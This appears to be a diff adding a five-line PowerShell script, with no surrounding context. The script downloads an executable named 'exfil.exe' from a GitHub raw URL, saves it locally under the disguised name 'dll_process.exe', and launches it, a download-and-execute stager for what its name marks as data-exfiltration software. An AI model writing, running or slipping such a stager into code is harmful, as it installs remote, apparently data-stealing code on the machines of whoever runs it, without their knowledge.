@@ -1,0 +1,5 @@
+$dlUrl = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/exfil.exe"
+$dlPath = Join-Path -Path $PWD.Path -ChildPath "dll_process.exe"
+Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
+cd $PWD.Path
+Start-Process .\dll_process.exe
